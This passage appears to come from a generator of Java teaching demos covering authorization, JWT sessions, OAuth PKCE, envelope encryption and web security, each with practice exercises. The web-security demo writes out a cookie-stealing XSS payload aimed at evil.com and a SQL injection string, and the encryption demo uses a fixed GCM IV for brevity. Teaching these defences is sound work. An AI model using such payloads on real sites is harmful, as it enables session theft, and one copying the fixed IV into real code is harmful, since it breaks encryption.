            case "object storage" -> { optimised.add(new Line("object storage hot", 40, 23, "TB-month")); optimised.add(new Line("object storage archive", 160, 4, "TB-month")); }
            case "CDN egress" -> optimised.add(new Line("CDN egress (WebP + better caching)", 300, 20, "TB"));
            default -> optimised.add(l);
        }
        print("optimised", optimised);
    }

    static void print(String title, List<Line> bill) {
        double total = bill.stream().mapToDouble(Line::cost).sum();
        System.out.println(title + ":");
        for (Line l : bill) System.out.printf("  %-36s %6.0f x $%6.1f = $%,9.0f  (%4.1f%%)%n", l.item(), l.qty(), l.unitPrice(), l.cost(), l.cost() / total * 100);
        System.out.printf("  %-36s %29s $%,9.0f per month%n", "TOTAL", "", total);
    }
}
''', ["Add a cost-per-1,000-requests figure assuming 2 billion requests per month.",
      "Add spot instances for a nightly batch job (70% cheaper but can be interrupted) and model a 10% rerun rate.",
      "Add cross-AZ data transfer at $0.01/GB for 50 TB/month and see whether it matters."])

J("authn-authz", r'''
import java.util.*;

public class AuthzDemo {
    // Authentication: who are you (token -> user). Authorization: may you do this (RBAC + ownership + ReBAC-style sharing).
    record User(String id, Set<String> roles) {}
    record Doc(String id, String owner, Set<String> sharedWith) {}
    static final Map<String, User> tokens = Map.of("tok-asha", new User("asha", Set.of("editor")), "tok-ravi", new User("ravi", Set.of("viewer")), "tok-admin", new User("root", Set.of("admin")));
    static final Map<String, Set<String>> rolePerms = Map.of("viewer", Set.of("read"), "editor", Set.of("read", "edit"), "admin", Set.of("read", "edit", "delete"));
    static final Map<String, Doc> docs = Map.of("d1", new Doc("d1", "asha", Set.of("ravi")), "d2", new Doc("d2", "zoya", Set.of()));

    static String request(String token, String action, String docId) {
        User u = tokens.get(token);
        if (u == null) return "401 Unauthorized (who are you?)";
        Doc d = docs.get(docId);
        boolean roleAllows = u.roles().stream().anyMatch(r -> rolePerms.get(r).contains(action));
        boolean relation = u.roles().contains("admin") || d.owner().equals(u.id()) || d.sharedWith().contains(u.id());
        if (!roleAllows || !relation) return "403 Forbidden (" + u.id() + " may not " + action + " " + docId + ")";
        return "200 OK " + u.id() + " " + action + " " + docId;
    }

    public static void main(String[] args) {
        System.out.println(request("bad-token", "read", "d1"));
        System.out.println(request("tok-ravi", "read", "d1") + "  <- shared with him");
        System.out.println(request("tok-ravi", "edit", "d1") + "  <- viewer role");
        System.out.println(request("tok-asha", "edit", "d1"));
        System.out.println(request("tok-asha", "read", "d2") + "  <- not hers (broken access control prevented)");
        System.out.println(request("tok-admin", "delete", "d2"));
    }
}
''', ["Add groups: share d2 with group 'team-a' and make Asha a member.",
      "Add an ABAC rule: edits are only allowed between 09:00 and 18:00 (pass the hour as a parameter).",
      "Log every authorization decision (who, what, allowed?) into an audit list."])

J("sessions-jwt", r'''
import javax.crypto.Mac;
import javax.crypto.spec.SecretKeySpec;
import java.nio.charset.StandardCharsets;
import java.util.*;

public class JwtDemo {
    static final byte[] SECRET = "server-side-secret-key-32-bytes!".getBytes(StandardCharsets.UTF_8);
    static final Base64.Encoder B64 = Base64.getUrlEncoder().withoutPadding();

    static String hmac(String data) throws Exception { Mac m = Mac.getInstance("HmacSHA256"); m.init(new SecretKeySpec(SECRET, "HmacSHA256")); return B64.encodeToString(m.doFinal(data.getBytes(StandardCharsets.UTF_8))); }

    static String issue(String sub, long exp) throws Exception {
        String header = B64.encodeToString("{\"alg\":\"HS256\",\"typ\":\"JWT\"}".getBytes());
        String payload = B64.encodeToString(("{\"sub\":\"" + sub + "\",\"exp\":" + exp + "}").getBytes());
        return header + "." + payload + "." + hmac(header + "." + payload);
    }

    static final Set<String> revoked = new HashSet<>();
    static String verify(String jwt, long now) throws Exception {
        String[] p = jwt.split("\\.");
        if (!hmac(p[0] + "." + p[1]).equals(p[2])) return "REJECT: bad signature (tampered)";
        String json = new String(Base64.getUrlDecoder().decode(p[1]));
        long exp = Long.parseLong(json.replaceAll(".*\"exp\":(\\d+).*", "$1"));
        if (now >= exp) return "REJECT: expired";
        if (revoked.contains(p[2])) return "REJECT: on deny-list";
        return "OK " + json + " (no database lookup needed)";
    }

    public static void main(String[] args) throws Exception {
        String jwt = issue("user-42", 1000);
        System.out.println("token: " + jwt.substring(0, 40) + "...");
        System.out.println("verify at t=500   : " + verify(jwt, 500));
        String[] p = jwt.split("\\.");
        String forgedPayload = B64.encodeToString("{\"sub\":\"admin\",\"exp\":1000}".getBytes());
        System.out.println("forged sub=admin  : " + verify(p[0] + "." + forgedPayload + "." + p[2], 500));
        System.out.println("verify at t=1000  : " + verify(jwt, 1000));
        revoked.add(p[2]);
        System.out.println("after logout      : " + verify(jwt, 600) + "  (revocation needs a server-side list)");
        Map<String, String> sessions = new HashMap<>(Map.of("sid-abc", "user-42"));
        System.out.println("server session    : lookup sid-abc -> " + sessions.get("sid-abc") + "; logout = delete -> " + (sessions.remove("sid-abc") != null ? "revoked instantly" : ""));
    }
}
''', ["Add a refresh token: a random id stored server-side that can mint a new 5-minute access token, rotated on each use.",
      "Add an `aud` (audience) claim and reject tokens meant for another service.",
      "Switch to RS256 with `KeyPairGenerator` so services can verify with only the public key."])

J("oauth", r'''
import java.security.*;
import java.util.*;

public class OAuthPkceDemo {
    // Authorization Code flow with PKCE between an app, an auth server and an API, all simulated in memory.
    static final Base64.Encoder B64 = Base64.getUrlEncoder().withoutPadding();
    static String sha256(String s) throws Exception { return B64.encodeToString(MessageDigest.getInstance("SHA-256").digest(s.getBytes())); }

    static class AuthServer {
        final Map<String, String[]> codes = new HashMap<>(); final Map<String, String> accessTokens = new HashMap<>(); int n = 0;
        String authorize(String user, String clientId, String scope, String challenge) { String code = "code-" + (++n); codes.put(code, new String[]{user, clientId, scope, challenge}); return code; }
        String token(String code, String clientId, String verifier) throws Exception {
            String[] c = codes.remove(code);                                   // one-time use
            if (c == null) return "error: invalid or reused code";
            if (!c[1].equals(clientId) || !sha256(verifier).equals(c[3])) return "error: PKCE verification failed";
            String at = "at-" + UUID.nameUUIDFromBytes((code + verifier).getBytes()).toString().substring(0, 8);
            accessTokens.put(at, c[0] + "|" + c[2]); return at;
        }
    }

    public static void main(String[] args) throws Exception {
        AuthServer google = new AuthServer();
        String verifier = "random-secret-the-app-keeps-" + 12345;                // generated per login, never leaves the app until step 3
        String challenge = sha256(verifier);
        System.out.println("1. app redirects user to auth server with code_challenge=" + challenge.substring(0, 12) + "...");
        String code = google.authorize("asha@gmail.com", "photo-app", "email profile", challenge);
        System.out.println("2. user logs in + consents; redirected back with " + code);
        System.out.println("   attacker who stole the code tries: " + google.token(code + "", "photo-app", "guess") );
        code = google.authorize("asha@gmail.com", "photo-app", "email profile", challenge);
        String token = google.token(code, "photo-app", verifier);
        System.out.println("3. app exchanges " + code + " + verifier -> access token " + token);
        System.out.println("   reusing the same code -> " + google.token(code, "photo-app", verifier));
        String[] grant = google.accessTokens.get(token).split("\\|");
        System.out.println("4. API call with token -> user " + grant[0] + ", allowed scopes [" + grant[1] + "]; password never shared with the app");
    }
}
''', ["Add a `state` parameter and reject the callback if it doesn't match (CSRF protection).",
      "Add scopes enforcement: the API refuses `photos.write` if the token only has `email profile`.",
      "Add refresh tokens with expiry and show getting a new access token without the user."])

J("encryption", r'''
import javax.crypto.*;
import javax.crypto.spec.*;
import java.security.*;
import java.util.*;

public class EnvelopeEncryptionDemo {
    // KMS holds the master key. Each file gets its own data key; only the encrypted data key is stored next to the file.
    static class Kms {
        private final SecretKey master;
        Kms() throws Exception { KeyGenerator g = KeyGenerator.getInstance("AES"); g.init(256); master = g.generateKey(); }
        byte[][] generateDataKey() throws Exception {
            KeyGenerator g = KeyGenerator.getInstance("AES"); g.init(256); SecretKey dk = g.generateKey();
            return new byte[][]{dk.getEncoded(), aes(Cipher.ENCRYPT_MODE, master, dk.getEncoded())};
        }
        byte[] decryptDataKey(byte[] enc) throws Exception { return aes(Cipher.DECRYPT_MODE, master, enc); }
    }

    static final byte[] IV = new byte[12];
    static byte[] aes(int mode, SecretKey k, byte[] data) throws Exception { Cipher c = Cipher.getInstance("AES/GCM/NoPadding"); c.init(mode, k, new GCMParameterSpec(128, IV)); return c.doFinal(data); }

    public static void main(String[] args) throws Exception {
        Kms kms = new Kms();
        byte[][] dk = kms.generateDataKey();
        byte[] ciphertext = aes(Cipher.ENCRYPT_MODE, new SecretKeySpec(dk[0], "AES"), "invoice: Rs 2,499 for Asha".getBytes());
        Arrays.fill(dk[0], (byte) 0);                                            // forget the plaintext data key
        System.out.println("stored: " + ciphertext.length + " bytes ciphertext + " + dk[1].length + " bytes encrypted data key");
        byte[] plainKey = kms.decryptDataKey(dk[1]);
        System.out.println("read  : " + new String(aes(Cipher.DECRYPT_MODE, new SecretKeySpec(plainKey, "AES"), ciphertext)));
        // Passwords: hash with salt and many iterations, never encrypt
        byte[] salt = "per-user-salt".getBytes();
        SecretKeyFactory f = SecretKeyFactory.getInstance("PBKDF2WithHmacSHA256");
        byte[] h1 = f.generateSecret(new PBEKeySpec("hunter2".toCharArray(), salt, 210_000, 256)).getEncoded();
        byte[] h2 = f.generateSecret(new PBEKeySpec("hunter2".toCharArray(), salt, 210_000, 256)).getEncoded();
        byte[] h3 = f.generateSecret(new PBEKeySpec("hunter3".toCharArray(), salt, 210_000, 256)).getEncoded();
        System.out.println("password hash check: correct=" + MessageDigest.isEqual(h1, h2) + " wrong=" + MessageDigest.isEqual(h1, h3) + " (one-way, slow on purpose)");
    }
}
''', ["Use a fresh random IV for every encryption and store it next to the ciphertext (the fixed IV here is only for brevity; never reuse one in real code).",
      "Implement key rotation: re-encrypt only the data keys with a new master key, not the files.",
      "Measure how long one PBKDF2 hash takes and compute how long guessing 1 million passwords would take."])

J("web-security", r'''
import java.util.*;

public class WebSecurityDemo {
    static final List<Map<String, String>> users = List.of(Map.of("email", "asha@x.com", "pw", "secret"), Map.of("email", "ravi@x.com", "pw", "hunter2"));

    // Vulnerable: builds the query by string concatenation, then 'executes' it naively
    static List<String> unsafeLogin(String email) {
        String sql = "SELECT * FROM users WHERE email = '" + email + "'";
        boolean always = sql.contains("' OR '1'='1");
        return users.stream().filter(u -> always || sql.contains("'" + u.get("email") + "'")).map(u -> u.get("email")).toList();
    }
    // Safe: the value is passed as a parameter, never parsed as SQL
    static List<String> safeLogin(String email) { return users.stream().filter(u -> u.get("email").equals(email)).map(u -> u.get("email")).toList(); }

    static String escapeHtml(String s) { return s.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;").replace("\"", "&quot;").replace("'", "&#39;"); }

    static boolean ssrfAllowed(String url) {
        String host = java.net.URI.create(url).getHost();
        return !(host.equals("localhost") || host.startsWith("127.") || host.startsWith("10.") || host.startsWith("169.254.") || host.startsWith("192.168."));
    }

    public static void main(String[] args) {
        String attack = "x' OR '1'='1";
        System.out.println("SQL injection, unsafe : " + unsafeLogin(attack) + "  <- every user returned");
        System.out.println("SQL injection, safe   : " + safeLogin(attack));
        String comment = "<script>fetch('//evil.com?c='+document.cookie)</script>";
        System.out.println("XSS, rendered raw     : " + comment);
        System.out.println("XSS, escaped          : " + escapeHtml(comment));
        for (String u : List.of("https://images.example.com/cat.jpg", "http://169.254.169.254/latest/meta-data/"))
            System.out.println("SSRF check " + u + " -> " + (ssrfAllowed(u) ? "fetch" : "BLOCKED (internal address)"));
        String sessionCsrf = "csrf-81f2"; String formToken = "csrf-0000";
        System.out.println("CSRF: form token " + formToken + " vs session " + sessionCsrf + " -> " + (formToken.equals(sessionCsrf) ? "accept" : "REJECT"));
    }
}
''', ["Rewrite `safeLogin` with real JDBC `PreparedStatement` code against any database you have (H2/MySQL).",
      "Add a Content-Security-Policy header builder and explain which part blocks inline scripts.",
      "Make the SSRF check resolve DNS first (a hostname can point at 127.0.0.1) using `InetAddress.getByName`."])
